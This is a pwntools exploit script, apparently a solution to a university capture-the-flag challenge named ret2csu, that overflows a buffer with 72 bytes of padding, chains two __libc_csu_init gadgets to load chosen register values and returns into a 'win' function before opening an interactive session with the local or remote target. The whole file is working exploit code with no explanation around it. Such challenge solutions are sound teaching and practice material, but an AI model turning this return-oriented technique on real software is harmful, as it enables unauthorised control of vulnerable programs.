from pwn import *
import inspect

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break main
break *0x4008e8
continue
'''

libc = e.libc
def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-ret2csu-1.chals.io", 443, ssl=True, sni="cse4850-ret2csu-1.chals.io")
    else:
        return process(e.path)


p = start()

fini_ptr = 0x600e48
chain = cyclic(72) # padding for overflow

chain += p64(e.sym['__libc_csu_init'] + 90)          # first gadget
chain += p64(0)
chain += p64(0x1)
chain += p64(fini_ptr)                               # r12 = ptr to _fini
chain += p64(0xbe)                                   # rdi = 0xbe
chain += p64(0xb01d)                                 # rsi = 0xb01d
chain += p64(0xface)                                 # rdx = 0xface

chain += p64(e.sym['__libc_csu_init'] + 64)          # second gadget
chain += p64(0)                                      # padding
chain += p64(0x1)       
chain += p64(0x1)
chain += p64(0xbad)                                   # r12 = 0xbad                                     
chain += p64(0xd0)                                    # r13 = 0xd0
chain += p64(0xc4a53)                                 # r14 = 0xc4a53
chain += p64(0)                                       # r15
chain += p64(e.sym['win'])                            # Return

p.sendlineafter(b'>>>', chain)
p.interactive()

